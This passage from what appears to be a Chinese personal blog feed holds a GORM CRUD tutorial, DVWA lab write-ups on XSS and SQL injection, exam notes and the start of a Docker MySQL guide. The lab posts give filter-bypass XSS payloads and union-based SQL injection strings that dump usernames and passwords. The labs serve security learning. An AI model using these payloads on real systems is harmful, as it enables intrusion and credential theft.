class="code"><pre><span class="line"><span class="comment">// 使用 Scanner/Valuer</span></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">ID <span class="keyword">int64</span></span><br><span class="line">Name sql.NullString <span class="string">`gorm:&quot;default:&#x27;小王子&#x27;&quot;`</span> <span class="comment">// sql.NullString 实现了Scanner/Valuer接口,是一个结构体</span></span><br><span class="line">Age  <span class="keyword">int64</span></span><br><span class="line">&#125;</span><br><span class="line">user := User&#123;Name: sql.NullString&#123;<span class="string">&quot;&quot;</span>, <span class="literal">true</span>&#125;, Age:<span class="number">18</span>&#125;<span class="comment">//设置为ture时，数据库就知道存入前面的string字段&quot;&quot;，如果设置为false就用默认值</span></span><br><span class="line">db.Create(&amp;user)  <span class="comment">// 此时数据库中该条记录name字段的值就是&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p> ​        有的结构体用到指针类型就是因为这个原因，该字段可能传入零值为了防止被存为默认值就用指针或者方法2</p></li><li><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Model <span class="keyword">struct</span> &#123;   <span class="comment">//gorm.model</span></span><br><span class="line">   ID        <span class="keyword">uint</span> <span class="string">`gorm:&quot;primary_key&quot;`</span></span><br><span class="line">   CreatedAt time.Time   <span class="comment">//该记录的创建时间</span></span><br><span class="line">   UpdatedAt time.Time <span class="comment">//该记录的更新时间</span></span><br><span class="line">   DeletedAt *time.Time <span class="string">`sql:&quot;index&quot;`</span><span class="comment">//该记录的删除时间，某条记录的该字段值不为null时表明被删除&lt;-软删除</span></span><br></pre></td></tr></table></figure></li><li><p>当要用where的时候有两种写法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//写法一</span></span><br><span class="line">db.Where(<span class="string">&quot;name = ?&quot;</span>, <span class="string">&quot;jinzhu&quot;</span>).Find(&amp;users)<span class="comment">//users为User结构体切片</span></span><br><span class="line"><span class="comment">//写法二，内联条件</span></span><br><span class="line">db.Find(&amp;user, <span class="string">&quot;name = ?&quot;</span>, <span class="string">&quot;jinzhu&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>使用 struct 更新时，只会更新非零值字段，所以建议使用map</p></li><li><p>代码里出现User{}，其代表的就是数据库中的user表</p></li><li><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db.Model(&amp;user).函数<span class="comment">//给查询出来的一条数据应用后面的函数</span></span><br><span class="line">db.Model(&amp;users).函数<span class="comment">//给查询出来的全部数据应用后面的函数</span></span><br><span class="line">db.Model(&amp;user&#123;&#125;).函数<span class="comment">//给user表应用后面的函数</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>在查询出来的结果中指定条件更新</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.Model(&amp;users).Where(<span class="string">&quot;age &gt; 10&quot;</span>).UpdateColumn(<span class="string">&quot;age&quot;</span>, gorm.Expr(<span class="string">&quot;age - ?&quot;</span>, <span class="number">1</span>))</span><br></pre></td></tr></table></figure></li><li><p>更新多个字段用updates，更新一个字段用update</p></li><li><p>当结构体嵌入gorm.Modle时gorm的删除都是软删除，即给delet字段加时间，如果要真删除，调用Unscoped()</p><p>当然结构体没有嵌入gorm.Modle时gorm的删除都是真删除</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 物理删除</span></span><br><span class="line">db.Debug().Unscoped().Where(<span class="string">&quot;name=?&quot;</span>, <span class="string">&quot;aaa&quot;</span>).Delete(User&#123;&#125;)</span><br></pre></td></tr></table></figure><h3 id="Gorm-CURD"><a href="#Gorm-CURD" class="headerlink" title="Gorm CURD"></a>Gorm CURD</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main <span class="comment">//CRUD基本操作</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="comment">//&quot;database/sql&quot;</span></span><br><span class="line">   <span class="string">&quot;fmt&quot;</span></span><br><span class="line">   <span class="string">&quot;github.com/jinzhu/gorm&quot;</span></span><br><span class="line">   <span class="comment">//&quot;time&quot;</span></span><br><span class="line">   _ <span class="string">&quot;github.com/jinzhu/gorm/dialects/mysql&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">//type User struct &#123;</span></span><br><span class="line"><span class="comment">// gorm.Model</span></span><br><span class="line"><span class="comment">// Name         string</span></span><br><span class="line"><span class="comment">// Age          sql.NullInt64</span></span><br><span class="line"><span class="comment">// Birthday     *time.Time</span></span><br><span class="line"><span class="comment">// Email        string  `gorm:&quot;type:varchar(100);unique_index&quot;`</span></span><br><span class="line"><span class="comment">// Role         string  `gorm:&quot;size:255&quot;` // 设置字段大小为255</span></span><br><span class="line"><span class="comment">// MemberNumber *string `gorm:&quot;unique;not null&quot;` // 设置会员号（member number）唯一并且不为空</span></span><br><span class="line"><span class="comment">// Num          int     `gorm:&quot;AUTO_INCREMENT&quot;` // 设置 num 为自增类型</span></span><br><span class="line"><span class="comment">// Address      string  `gorm:&quot;index:addr&quot;` // 给address字段创建名为addr的索引</span></span><br><span class="line"><span class="comment">// IgnoreMe     int     `gorm:&quot;-&quot;` // 忽略本字段</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">// 1.定义模型</span></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">   gorm.Model</span><br><span class="line">   Name <span class="keyword">string</span> <span class="string">`gorm:&quot;default:&#x27;xupt_w&#x27;&quot;`</span><span class="comment">//默认值为xupt_w</span></span><br><span class="line">   Age <span class="keyword">int64</span></span><br><span class="line">   Active <span class="keyword">bool</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="comment">//链接mysql数据库</span></span><br><span class="line">   db, err := gorm.Open(<span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;root:root1234@(192.168.99.100:13306)/db1?charset=utf8mb4&amp;parseTime=True&amp;loc=Local&quot;</span>)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">      fmt.Println(<span class="string">&quot;err is &quot;</span>,err)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> db.Close()</span><br><span class="line">   <span class="comment">//2.把模型与数据库中的表对应起来，即创建一个对应user表</span></span><br><span class="line">   db.AutoMigrate(&amp;User&#123;&#125;)</span><br><span class="line"></span><br><span class="line">   <span class="comment">//3.创建</span></span><br><span class="line">   u := User&#123;Name:<span class="string">&quot;wjk&quot;</span>,Age:<span class="number">21</span>&#125;</span><br><span class="line">   db.Debug().Create(&amp;u)<span class="comment">//如果想要看这句执行了什么sql语句可以加debug()函数</span></span><br><span class="line">   fmt.Println(db.NewRecord(&amp;u))<span class="comment">//判断是否该条记录存在</span></span><br><span class="line">   u1 := User&#123;Name:<span class="string">&quot;aaa&quot;</span>,Age:<span class="number">19</span>&#125;</span><br><span class="line">   u2 := User&#123;Name:<span class="string">&quot;bbb&quot;</span>,Age:<span class="number">20</span>&#125;</span><br><span class="line">   db.Create(&amp;u1)</span><br><span class="line">   db.Create(&amp;u2)</span><br><span class="line">   u3 := User&#123;Name:<span class="string">&quot;ccc&quot;</span>,Age:<span class="number">21</span>&#125;</span><br><span class="line">   db.Create(&amp;u3)</span><br><span class="line"></span><br><span class="line">   <span class="comment">//4. 查询</span></span><br><span class="line">   <span class="keyword">var</span> user User</span><br><span class="line">   db.First(&amp;user)<span class="comment">//返回值为结构体存储在user变量</span></span><br><span class="line">   fmt.Println(user)</span><br><span class="line">   <span class="comment">//如果查询多条记录，则要先定义一个结构体切片</span></span><br><span class="line">   <span class="keyword">var</span> users []User</span><br><span class="line">   db.Find(&amp;users)</span><br><span class="line">   fmt.Println(users)</span><br><span class="line">   <span class="comment">//其他的查询操作见https://www.liwenzhou.com/posts/Go/gorm_crud/#autoid-1-3-3</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//5. 更新</span></span><br><span class="line">   db.Model(&amp;user).Update(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;hello&quot;</span>)</span><br><span class="line">   <span class="comment">//// UPDATE users SET name=&#x27;hello&#x27;, updated_at=&#x27;2013-11-17 21:34:10&#x27; WHERE id=111;</span></span><br><span class="line">   <span class="comment">//注意在执行update函数时会执行几个gorm的钩子(hook)函数，该函数的作用是同时更新updated_at字段，如果不想更新updated_at字段即禁用hook函数可以使用UpdateColumn函数</span></span><br><span class="line">   <span class="comment">//修改多个字段,利用map，如果想更新或忽略某些字段，可以使用 Select，Omit</span></span><br><span class="line">   db.Model(&amp;user).Updates(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;john&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">18</span>, <span class="string">&quot;active&quot;</span>: <span class="literal">false</span>&#125;)</span><br><span class="line">   <span class="comment">//其他的查询操作见https://www.liwenzhou.com/posts/Go/gorm_crud/#autoid-1-3-3</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//6. 删除</span></span><br><span class="line">   db.Delete(&amp;user)</span><br><span class="line">   <span class="comment">//GORM 会通过主键去删除记录，所以也可以通过</span></span><br><span class="line">   <span class="keyword">var</span> s=User&#123;&#125;</span><br><span class="line">   s.ID=<span class="number">2</span></span><br><span class="line">   db.Delete(&amp;s)<span class="comment">//删除id为2的数据，DELETE from users where id=2;如果主键为空，GORM 会删除该表的所有记录</span></span><br><span class="line">   <span class="comment">//以上的删除方法太麻烦，还要传入主键才能删除，以下为简便方法删除name=&#x27;wjk&#x27;这条的方法</span></span><br><span class="line">   db.Where(<span class="string">&quot;name=?&quot;</span>, <span class="string">&quot;wjk&quot;</span>).Delete(User&#123;&#125;)</span><br><span class="line">   <span class="comment">//或者，同样的效果</span></span><br><span class="line">   db.Delete(User&#123;&#125;, <span class="string">&quot;name=?&quot;</span>, <span class="string">&quot;wjk&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><blockquote><p> <a href="https://www.liwenzhou.com/posts/Go/gorm/">https://www.liwenzhou.com/posts/Go/gorm/</a></p><p> <a href="https://www.liwenzhou.com/posts/Go/gorm_crud/#autoid-1-3-3">https://www.liwenzhou.com/posts/Go/gorm_crud/#autoid-1-3-3</a></p></blockquote><p>源码地址：</p><p><a href="https://github.com/Q1mi/go_web">https://github.com/Q1mi/go_web</a></p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gorm </tag>
            
            <tag> Golang </tag>
            
            <tag> template </tag>
            
            <tag> 中间件 </tag>
            
            <tag> CURD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA之XSS漏洞复现</title>
      <link href="/2021/07/15/dvwa_xss/"/>
      <url>/2021/07/15/dvwa_xss/</url>
      
        <content type="html"><![CDATA[<p>一、实验环境</p><p> 一台win10电脑，既做服务器端，也是客户端。</p><p>二、实验原理</p><p>反射型XSS用户通过Web客户端提交给服务端的数据，立刻用于解析和显示该用户的结果页面(数据没有在服务端存储)。</p><p>存储型XSS用户通过Web客户端提交给服务端的数据，由服务端保存，然后永久显示在其他用户的页面上。</p><p>三、实验步骤</p><p>(1)登录dvwa，点击反射型xss low级别：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image002.jpg"></p><p>  2.测试输入<script>alert（123）</script></p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715092334.jpg"></p><ol start="3"><li>查看源码并没有任何字符处理措施：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715092354.jpg"></p><p>(2) 将级别改为meduim，执行<script>alert（123）</script>测试</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715092401.jpg"></p><p>说明可能存在字符消除函数，删掉了<script>或者</script></p><p>所以输入&lt;scri<script>pt>alert(123)</script>试试</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715092413.jpg"></p><p>成功</p><p>查看源码，只是经过了简单的将<script>转换为null的过程：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715092419.jpg"></p><p>（3）切换到high级别</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715092423.jpg"></p><p>换一个其他弹窗代码，不用<script>改为<img src=0 onerror="alert('xss')"></p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715092427.jpg"></p><p>成功弹窗</p><p>（2）存储型xss，级别low：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715092431.jpg"></p><p>尝试输入<script>alert(‘xss’)</script>发现输入到l时无法再进行输入</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715092436.jpg"></p><p>查看网页源代码，发现输入最大长度为10：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715092741.jpg"></p><p>所以尝试使用burp抓包修改参数</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715092443.jpg"></p><p>成功弹窗</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715092449.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715092453.jpg"></p><p>数据库中成功加入javascript代码，而且在每次刷新页面加载评论时都会出发script代码</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715092457.jpg"></p><p>刷新页面，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715092500.jpg"></p><p>2.更改为medium级别</p><p>继续利用burp修改参数为<script>alert(‘xss’)</script>发现返回：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715092510.jpg"></p><p>并没有出现弹窗，并且用户名变为了alert（‘xss’）所以猜测可能使用了字符替代函数，因为js区分大小写，这次可以使用大小写来绕过:</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715092514.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715092517.jpg"></p><p>成功绕过，显示弹窗，且每次刷新都会弹窗</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715092525.jpg"></p><p>查看数据库，成功添加</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715092529.jpg"></p><p>3.改为high级别，查看源码继续使用了正则表达式</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715092534.jpg"></p><p>所以不使用&lt; script &gt;弹窗，改用img标签</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715092538.jpg"></p><p>成功弹窗</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715092542.jpg"></p><p>查看数据库，成功添加，再后来每一次刷新都会触发一次js代码</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715092549.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> DVWA </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>考研数一笔记</title>
      <link href="/2021/07/15/%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/07/15/%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="笔记说明"><a href="#笔记说明" class="headerlink" title="笔记说明"></a>笔记说明</h2><p>本人数一134，这个笔记是我根据2021版武钟祥老师的高数强化讲义以及李永乐老师的线代强化讲义以及余炳森老师的概率强化讲义写的，然后顺序就是按照我排好的看就可以（最好手里有这些书或者电子版），我这个笔记不是概念系统性笔记而是我在听课以及写题的时候觉得需要总结下来或者突然想起了一句话就赶紧记下来的那种，但是也覆盖了很多题型吧然后大部分都是一句话的形式。如果前面有记页码没写书名默认就是我上面提到的那些书，如果是其他书我都标注出来了比如李林880，1800，660，好像里面应该也有复习全书基础篇。然后还有很多前面是一个星号的就是我在写题和听课的时候脑子里闪过的一些话觉得挺重要就赶紧记下来所以没有页码。笔记字写得不好大家凑活看吧，然后里面高数线代概率都有但没有微分中值定理，这块比较灵活多做题靠个人悟了<br>如果看了觉得还不错麻烦也分享出去让更多的人看到，谢谢最后祝各位一战成硕！！！o(*≧▽≦)ツ<br>本人QQ：911365337，有啥问题可以来问我</p><blockquote><p>链接：<a href="https://pan.baidu.com/s/1r5a3kU4jU_uj_5jSbvNJ9g">https://pan.baidu.com/s/1r5a3kU4jU_uj_5jSbvNJ9g</a><br>提取码：10ec</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 考研笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA之sql注入漏洞复现</title>
      <link href="/2021/07/14/dvwa_sql/"/>
      <url>/2021/07/14/dvwa_sql/</url>
      
        <content type="html"><![CDATA[<p>一、实验环境</p><p>  一台win10电脑，既做服务器端，也是客户端。</p><p>二、实验原理</p><p>攻击者通过对服务器端注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。</p><p>三、实验步骤</p><h2 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h2><p>（1）登录dvwa，设置等级为low</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image001.png"></p><ol start="2"><li>第一步，判断是否存在注入，是字符型还是数字型</li></ol><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image003.png"></p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image005.png"></p><p>输入1’尝试</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image007.png"></p><p>提示1周围出现多个单引号</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image009.jpg"></p><p>故猜测sql查询语句为：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image010.png"></p><ol start="3"><li>猜测sql语句总共查询字段数（利用order by子句）</li></ol><p>（1）根据猜测的sql查询语句来构造</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image012.png"></p><p>注:# 注释掉sql语句后面引号</p><p>（2）输入构造语句</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image014.jpg"></p><p>输入1’ or 1=1 order by 2</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image016.jpg"></p><p>输入1’ or 1=1 order by 3</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715094141.png"></p><p>显示无第三列，所以猜测只有两个字段firstname以及secondname。</p><ol start="4"><li>确定字段顺序</li></ol><p>输入1’union select 1,2#</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715094920.png"></p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image019.png"></p><p>得到first_name在前，surname在后</p><ol start="5"><li>获取数据库名</li></ol><p>注：利用database（）函数和联合查询union</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715094919.png"></p><p>输入得：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715094922.png"></p><p>由此可看得数据库名为dvwa</p><ol start="6"><li>获取表名，和字段名</li></ol><p>利用mysql自带得表名存储表information_schema.tables</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image024.jpg"></p><p>输入1’union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image026.jpg"></p><p>注：结果两列利用group_concat合并</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image027.png"></p><p>同理利用1′union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’#</p><p>得：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image029.jpg"></p><ol start="7"><li>获得所有字段数据</li></ol><p>输入1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</p><p>得到：<img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715094921.png"></p><p>分析源码：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image033.jpg"></p><h2 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h2><p>（2）设置等级为medium</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/image-20210714231917348.png"></p><p>表单变成了可选项，目的是为了让用户在规定范围内选择，防止sql注入，但是我们可以利用burpsuit抓包，修改相应参数来达到sql注入。</p><ol><li>判断是字符型注入还是数字型</li></ol><p>修改参数为 2’ or 333=333 #</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image036.jpg"></p><p>返回页面，说明存在字符转义函数</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image038.jpg"></p><p>试试数字型注入</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image040.jpg"></p><p>成功爆出其他行数据，说明存在数字型注入</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image042.jpg"></p><p>总结：存在数字型注入且服务器代码存在字符转义</p><ol start="2"><li>推出sql语句中字段数，和字段顺序</li></ol><p>继续利用order by子句</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715094924.png"></p><p>返回结果：first_name被排序说明第一个字段为first_name</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image046.jpg"></p><p>继续以第二列排序，结果显示其surname被排序说明第二列为surname</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image047.png"></p><p>继续排序第三行，发现无第三行说明只有两行且前字段为first_name,后字段为surname</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image049.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715094913.png"></p><p>猜测sql语句为：</p><p>SELECT first_name, last_name FROM 表名 WHERE user_id = $id</p><ol start="3"><li>获取数据库名，以此获得表名</li></ol><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715094949.png"></p><p>返回结果显示表名为dvwa</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715094925.png"></p><ol start="4"><li>利用数据库名获取表名</li></ol><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image056.jpg"></p><p>返回结果显示有两个表guestbook，users</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715095552.png"></p><ol start="5"><li>获取表内字段名，因为存在字符转义所以将’users’改为十六进制0x7573657273：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image060.jpg"></p><p>返回界面显示了所有字段名</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image062.jpg"></p><ol start="6"><li>获取用户名密码</li></ol><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715094947.png"></p><p>返回界面成功显示</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image066.jpg"></p><ol start="7"><li>源码分析：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/clip_image068.jpg"></p><h2 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h2><p>（2）.high级别</p><ol><li>分析源码</li></ol><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715094948.png"></p><p>构造下列语句：</p><p>1’ or 1=1#</p><p>得到：</p><p>user_id = ‘1’ or 1=1#’ LIMIT 1;</p><p>成功注释掉limit 1，下面注入步骤和上述相同</p>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> DVWA </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker初识</title>
      <link href="/2021/07/14/docker/"/>
      <url>/2021/07/14/docker/</url>
      
        <content type="html"><![CDATA[<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>docker的使用，以安装mysql为例：</p><ol><li>双击Docker Quickstart Terminal，等待配置一会后出现如下界面（该界面进入docker的bash界面，可执行docker命令了）：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/image-20210713171628757.png"></p><ol start="2"><li><p>先下载mysql的镜像文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull mysql</span><br></pre></td></tr></table></figure><p>下载完成如下所示：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/image-20210713171956621.png"></p></li><li><p>然后使用以下命令来查看是否已安装了 mysql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>结果如下，可以看到成功下载了mysql镜像</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/image-20210713172139499.png"></p></li><li><p>安装完成后，我们可以使用以下命令来运行 一个带有mysql服务的容器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -itd --name mysql-test -p 13306:3306 -e MYSQL_ROOT_PASSWORD=root1234 mysql</span><br></pre></td></tr></table></figure><p>参数说明：</p><blockquote><p>-p 13306:3306 ：映射容器服务的 3306 端口到宿主机的 3306 端口，外部主机可以直接通过 <strong>宿主机ip:3306</strong> 访问到 MySQL 的服务。端口映射</p><p>MYSQL_ROOT_PASSWORD=root1234：设置mysql的root用户密码为root1234</p></blockquote><p>执行完该命令后如下图所示即为容器安装成功，并且因为我们使用了-d参数，所以在创建容器的同时启动了容器：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/image-20210713174948007.png"></p></li><li><p>可通过docker ps查看正在运行的容器</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/image-20210713175119932.png"></p></li><li><p>然后进入容器，通过命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it mysql8019 bash</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/image-20210713175433883.png"></p></li><li><p>这个时候我们就进入了该容器，接下来运行mysql：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 